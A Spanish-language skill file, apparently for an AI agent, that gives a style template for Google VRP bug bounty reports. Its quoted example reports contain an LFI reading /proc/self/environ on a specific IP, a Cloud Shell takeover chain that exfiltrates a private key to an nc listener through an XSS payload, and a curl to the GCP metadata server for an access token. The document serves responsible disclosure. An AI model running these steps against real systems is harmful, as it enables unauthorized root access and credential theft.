---
name: vrp-report-template
description: 'VRP report writing style for omespino — concise, direct, no padding. Summary in one line (product + vuln type + impact), numbered steps with sub-steps, concrete URLs/commands/IPs, brief attack scenario. Based on real accepted Google VRP reports (LFI as root, Cloud Shell takeover). Includes template, anti-patterns to avoid, and reward estimate guide. Spanish triggers — "reporte vrp", "escribir reporte vrp", "formato reporte bug bounty", "template vrp google", "como escribir reporte google", "vrp report style", "reporte bug bounty google", "estructura reporte vrp".'
---

## Estilo de reporte VRP — omespino

Basado en reportes aceptados por Google VRP. El principio es uno: **conciso y al grano**.

---

## Estructura

```
Summary:        <una línea — producto + tipo de vuln + impacto>
Preconditions:  <solo si el ataque requiere algo no obvio>
Steps to reproduce:
  1.- ...
  2.- ...
      2.1.- sub-paso si es necesario
Attack scenario:
  <párrafo breve — explica el "por qué es crítico" y el chain>
```

---

## Ejemplos reales

### Ejemplo A — LFI como root
```
Summary: LFI on google server 35.227.157.158 as ROOT

Steps to reproduce:

1. Navigate to http://35.227.157.158/labelaclz and verify:
      Owner Name: root
      Default LabelACL Policy: OPEN

2. Read arbitrary files as ROOT via /procz:
      http://35.227.157.158/procz?file=/proc/self/environ
      http://35.227.157.158/procz?file=/proc/cpuinfo
      http://35.227.157.158/procz?file=/proc/self/maps
      http://35.227.157.158/procz?file=/proc/meminfo
      http://35.227.157.158/procz?file=/proc/version
      http://35.227.157.158/procz?file=/proc/net/netstat

Attack scenario:
Any attacker can read any Google server file as ROOT.
```

### Ejemplo B — Cloud Shell takeover (root)
```
Summary: google cloud shell instance take over (as root)

Steps to reproduce:

1.- Setup a listener on a server you control (ngrok + nc on port 55555)

2.- Visit https://github.com/omespino/gcs_instace_takeover and click
    "Open in Google Cloud Shell"

3.- Click the preview button for the .md file

4.- Receive 2 files from the Google VM:
      4.1 /etc/hosts → extract the VM hostname
      4.2 ../id_cloudshell → private key (replace \n with newlines)

5.- Construct the SSH target:
      Remove "cs-6000-" from hostname prefix and append ".cloudshell.dev"
      Result: devshell-vm-XXXX-XXXX-XXXX-XXXX.cloudshell.dev

6.- Login as root:
      ssh -i id_cloudshell -p 6000 root@devshell-vm-XXXX-XXXX-XXXX-XXXX.cloudshell.dev

Attack scenario:
The .md preview runs in a sandbox with XSS (<style onload=alert(document.domain)>).
The sandbox domain exposes the Theia editor with full file access. The endpoint
/files/?uri=file:// reads any path including outside the container root (../ escape).
Combined: attacker reads /etc/hosts (for hostname) + ../id_cloudshell (private key)
→ SSH root access to any victim's Cloud Shell instance.

PoC: https://youtu.be/KFzShR2PvvI
```

---

## Template en blanco

```
Summary: <product> <vuln type> <impact in 3-5 words>

Preconditions:
- <solo si requiere acceso previo, cuenta especial, o condición no obvia>

Steps to reproduce:

1.- <acción concreta>

2.- <acción con resultado observable>
      <URL o comando exacto>
      <output esperado>

3.- <si aplica, sub-pasos para construir el vector>
      3.1 <sub-paso>
      3.2 <sub-paso>

Attack scenario:
<1-3 oraciones. Explica: qué habilita la vuln + impacto máximo posible.
Si es un chain: describe cada eslabón brevemente. No repetir los pasos.>

PoC: <video, screenshot, o curl command con output real>
```

---

## Reglas de escritura

**Summary — una sola línea**
```
✓ LFI on google server 35.227.157.158 as ROOT
✓ google cloud shell instance take over (as root)
✓ SSRF in Cloud Monitoring Uptime Check → GCP metadata token
✗ "Critical vulnerability found in Google's infrastructure that allows..."
✗ "Vulnerability Report: Server-Side Request Forgery in..."
```

**Steps — directos, con evidencia**
```
✓ Navigate to http://target/procz?file=/proc/self/environ
✓ Run: curl -H "Metadata-Flavor: Google" http://169.254.169.254/...
✓ Receive response: {"access_token": "ya29...", "expires_in": 3599}
✗ "The researcher then proceeded to navigate to the vulnerable endpoint..."
✗ "Step 3: At this point, the vulnerability becomes apparent."
```

**Attack scenario — el "por qué importa"**
```
✓ Any Google Cloud user can steal the service account token of any
  AppSheet application and pivot to GCP resources.
✗ "This vulnerability is extremely critical and could potentially allow
  malicious actors to potentially compromise sensitive systems."
```

---

## Anti-patrones — nunca incluir

- Disclaimers ("I tested only on my own account")
- CVSS score en el cuerpo del reporte (Google lo asigna internamente)
- Secciones de "Background" o "Introduction"
- Frases como "I hope this helps" / "Thank you for your time"
- Descripción teórica sin PoC verificado
- Capturas de pantalla sin texto alternativo que explique qué se ve
- Múltiples variantes del mismo payload (elegir el más directo)

---

## Verificación del token (incluir cuando el PoC obtiene credenciales)

```bash
# Verificar access token de GCP
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=<TOKEN>"

# Verificar token de Google (general)
curl -s "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=<TOKEN>"

# Ver scopes del token
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=<TOKEN>" \
  | python3 -m json.tool | grep -E 'scope|email|exp|aud'
```

---

## Estimación de reward (Google VRP tabla)

| Vuln | Dominio T0 (*.google.com) | Dominio T2 (normal) |
|---|---|---|
| RCE (S0) | $101,010 | $75,000 |
| LFI/SQLi full (S1) | $75,000 | $50,000 |
| Auth bypass IT0 (S2a) | $50,000 | $31,337 |
| Auth bypass IT1 (S2b) | $31,337 | $13,337 |
| XSS en T0 (C0) | $20,000 | $10,000 |
| CSRF/Clickjacking IT0 (C1a) | $15,000 | $7,500 |

Multiplicador de calidad: 0.8x (bajo) / 1.0x (bueno) / 1.2x (excepcional)

**Para calidad excepcional (1.2x):**
- Descripción de la vuln clara y correcta
- Precondiciones de ataque bien definidas
- Impacto analizado con contexto del producto
- Steps reproducibles sin ambigüedad
- PoC automatizado o video cuando es posible
- Respuestas rápidas (<3 días) y técnicamente precisas al triage
